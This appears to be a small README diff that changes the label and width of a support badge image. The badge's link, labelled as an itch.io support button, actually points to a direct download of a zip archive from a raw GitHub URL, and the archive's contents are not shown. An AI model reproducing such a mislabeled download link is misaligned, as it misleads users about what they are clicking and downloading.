@@ -9,7 +9,7 @@ Please consider supporting:
 </a>
 or 
 <a href="https://raw.githubusercontent.com/irmaosver-e/SGTH/main/SGTH.zip">
-<img src="https://img.shields.io/badge/GitHub%20ItchIO-brightred" width="215" />
+<img src="https://img.shields.io/badge/ItchIO-red" width="200" />
 </a>
 
 
